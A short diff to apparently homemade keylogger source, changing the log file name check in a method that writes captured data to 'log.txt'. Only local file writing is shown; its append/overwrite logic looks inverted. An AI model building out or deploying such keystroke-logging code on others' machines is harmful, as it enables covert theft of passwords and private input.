@@ -10,9 +10,10 @@ class KeyLogger:
 
     def write(self):
         log_data = "".join(self.data)
+
         #write the data to local file
         mode = 'a'
-        if os.path.isfile('log.text'):
+        if os.path.isfile('log.txt'):
             mode = 'w'
 
         with open('log.txt', mode) as f:
